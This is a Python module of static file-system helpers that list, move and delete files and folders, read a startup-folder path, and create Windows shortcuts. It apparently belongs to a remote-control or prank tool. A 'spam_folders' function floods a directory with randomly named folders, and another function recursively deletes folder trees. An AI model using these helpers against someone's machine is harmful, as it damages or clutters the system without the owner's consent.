import os 
from ..constants import STARTUP_PATH
from random import randrange
import shutil

class FileSystem:
    @staticmethod
    def listdir(path):
        try:
            return os.listdir(path)
        except:
            return 0
    
    @staticmethod
    def get_start_up_contents():
        return os.listdir(STARTUP_PATH)

    @staticmethod
    def chdir(path):
        try:
            os.chdir(path)
            return 1
        except:
            return 0

    @staticmethod
    def getcwd():
        return os.getcwd()

    @staticmethod
    def list_current_directory():
        return os.listdir(os.getcwd())

    @staticmethod
    def delete_file(path):
        try:
            os.remove(path)
            return 1
        except:
            return 0

    @staticmethod
    def spam_folders(path, count):
        try:
            for _ in range(count):
                rand = randrange(1, 50000)
                os.makedirs(os.path.join(path , f"{rand}"))
            return 1
        except:
            return 0

    @staticmethod
    def delete_folder(path):
        try:
            shutil.rmtree(path)
            return 1
        except:
            return 0
    
    @staticmethod
    def make_directory(path):
        try:
            os.mkdir(path)
            return 1
        except:
            return 0
    
    @staticmethod
    def make_shortcut(file, destination):
        from swinlnk.swinlnk import SWinLnk
        swl = SWinLnk()
        swl.create_lnk(file, destination)

    @staticmethod
    def move_file(_from, to):
        os.replace(_from, to)
